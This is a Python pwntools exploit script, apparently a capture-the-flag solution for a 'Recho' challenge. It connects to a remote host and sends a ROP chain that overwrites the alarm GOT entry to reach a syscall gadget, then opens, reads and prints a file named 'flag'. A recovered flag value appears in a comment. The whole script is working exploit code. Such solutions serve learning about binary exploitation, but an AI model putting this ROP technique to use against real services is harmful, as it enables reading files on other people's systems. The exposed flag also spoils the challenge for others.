from pwn import *
from LibcSearcher import *
import time
context(arch='amd64', log_level='debug')

elf = ELF('./pwn')
io = process('./pwn')
io = remote('111.200.241.244', 56790)
# io.recvuntil(b'Welcome to Recho server!\n')
io.sendline(b'512')
# cyberpeace{b8bc7d90f0bcc4ecbb9f6ae916e1cb0b}
pop_rax_ret_addr = 0x4006fc
pop_rdx_ret_addr = 0x4006fe
pop_rdi_ret_addr = 0x4008a3
pop_rsi_r15_ret_addr = 0x4008a1
syscall_addr = 0x406000
add_rdi_rax_addr = 0x40070D
data_buf = 0x601070

# fill the rubbish spaces
payload = b'A' * 0x38
# pop address of function alarm() to rdi
payload += p64(pop_rdi_ret_addr) + p64(elf.got['alarm'])
# make rax = 5
payload += p64(pop_rax_ret_addr) + p64(5)
# add got address of alarm() of 5 (pointing to syscall)
payload += p64(add_rdi_rax_addr)

# open系统调用号为2, stored in eax

# rsi is the second argument of open: open mode('r')
payload += p64(pop_rsi_r15_ret_addr) + p64(0) + p64(0)
# rdi points for the address of const string 'flag'
payload += p64(pop_rdi_ret_addr) + p64(0x601058)
# get the system code of function 'open'
payload += p64(pop_rax_ret_addr) + p64(2)
# open the file 'flag'
payload += p64(elf.plt['alarm'])

# execute function read(fd, data_buffer, 100)

# get the second argument
payload += p64(pop_rsi_r15_ret_addr) + p64(data_buf) + p64(0)
# get the first argument (attention: 3 is fd value, because it's the first file opened, if we want to read the content of the second file opened, there should be 4.)
payload += p64(pop_rdi_ret_addr) + p64(3)
# get read length
payload += p64(pop_rdx_ret_addr) + p64(100)
# read the file 'flag' to string buffer
payload += p64(elf.plt['read'])

# then use printf to get it and finished.

# the second argument
# payload += p64(pop_rsi_r15_ret_addr) + p64(data_buf) + p64(0)
# the first argument
payload += p64(pop_rdi_ret_addr) + p64(data_buf)
# the third argument
# payload += p64(pop_rdx_ret_addr) + p64(32)
# printf
payload += p64(elf.plt['printf'])

payload = payload.ljust(512, b'\x00')
io.sendline(payload)
io.shutdown('write')
io.interactive()